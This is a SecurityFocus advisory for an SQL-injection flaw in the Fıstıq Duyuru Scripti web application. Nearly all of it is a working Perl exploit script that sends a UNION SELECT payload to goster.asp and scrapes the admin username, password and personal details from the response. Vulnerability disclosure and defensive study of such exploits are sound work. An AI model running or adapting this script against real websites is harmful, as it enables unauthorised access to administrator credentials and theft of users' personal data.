source: https://www.securityfocus.com/bid/22910/info

Duyuru Scripti is prone to an SQL-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in an SQL query.

Exploiting this vulnerability could permit remote attackers to pass malicious input to database queries, resulting in the modification of query logic or other attacks.

#!/usr/bin/perl
#[Script Name: F&#305;st&#305;q Duyuru Scripti
#[Coded by   : Cr@zy_King
#[Author     : Cr@zy_King
#[Contact    : crazy_king@eno7.org
#[S.Page     : http://www.isikkoyu.com/images/yeni/default.asp

use IO::Socket;
if(@ARGV < 1){
print "
[========================================================================
[//   F&#305;st&#305;q Duyuru Scripti Remote Blind SQL Injection Exploit
[//                   Usage: exploit.pl [target]
[//                   Example: exploit.pl victim.com
[//                   Example: exploit.pl victim.com
[//                           Vuln&Exp : Cr@zy_King (k)
[========================================================================
";
exit();
}
#Local variables
$server = $ARGV[0];
$server =~ s/(http:\/\/)//eg;
$host = "http://".$server;
$port = "80";
$file = "/goster.asp?id=";

print "Script <DIR> : ";
$dir = <STDIN>;
chop ($dir);

if ($dir =~ /exit/){
print "-- Exploit Failed[You Are Exited] \n";
exit();
}

if ($dir =~ /\//){}
else {
print "-- Exploit Failed[No DIR] \n";
exit();
  }


$target = "-1%20union+all+select+0,kullaniciadi,sifre,3+from+admin";

$target = $host.$dir.$file.$target;

#Writing data to socket
print
"+**********************************************************************+\n";
print "+ Trying to connect: $server\n";
$socket = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$server",
PeerPort => "$port") || die "\n+ Connection failed...\n";
print $socket "GET $target HTTP/1.1\n";
print $socket "Host: $server\n";
print $socket "Accept: */*\n";
print $socket "Connection: close\n\n";
print "+ Connected!...\n";
#Getting
while($answer = <$socket>) {
if ($answer =~ /name=\"login\" size=\"30\" class=\"gray_back\"
value=\"(.*?)\">/){
print "+ Exploit succeed! Getting admin information.\n";
print "+ ---------------- +\n";
print "+ Username: $1\n";
}

if ($answer =~ /name=\"password\" size=\"30\" class=\"gray_back\"
value=\"(.*?)\">/){
print "+ Password: $1\n";
}

if ($answer =~ /name=\"name\" size=\"30\" class=\"gray_back\"
value=\"(.*?)\">/){
print "+ Name: $1\n";
}

if ($answer =~ /name=\"email\" size=\"30\" class=\"gray_back\" value=\"(.*?)"
onBlur/){
print "+ Email: $1\n";
}

if ($answer =~ /name=\"address1\" size=\"30\" class=\"gray_back\"
value=\"(.*?)\">/){
print "+ Address1: $1\n";
}

if ($answer =~ /name=\"address2\" size=\"30\" class=\"gray_back\"
value=\"(.*?)\">/){
print "+ Address1: $1\n";
}

if ($answer =~ /name=\"city\" size=\"30\" class=\"gray_back\"
value=\"(.*?)\">/){
print "+ City: $1\n";
}

if ($answer =~ /name=\"postcode\" size=\"30\" class=\"gray_back\"
value=\"(.*?)\">/){
print "+ PostCode: $1\n";
}

if ($answer =~ /name=\"county\" size=\"30\" class=\"gray_back\"
value=\"(.*?)\">/){
print "+ Country: $1\n";
}

if ($answer =~ /name=\"phone\" size=\"30\" class=\"gray_back\"
value=\"(.*?)\">/){
print "+ Phone: $1\n";
}

if ($answer =~ /name=\"iurl\" size=\"24\" class=\"gray_back\"
value=\"(.*?)\">/){
print "+ Fax: $1\n";
}


if ($answer =~ /name=\"title\" size=\"30\" class=\"gray_back\"
value=\"(.*?)\">/){
print "+ Country: $1\n";
}

if ($answer =~ /Syntax error/) {
print "+ Exploit Failed : ( \n";
print
"+**********************************************************************+\n";
exit();
}

if ($answer =~ /Internal Server Error/) {
print "+ Exploit Failed : (  \n";
print
"+**********************************************************************+\n";
exit();
}
  }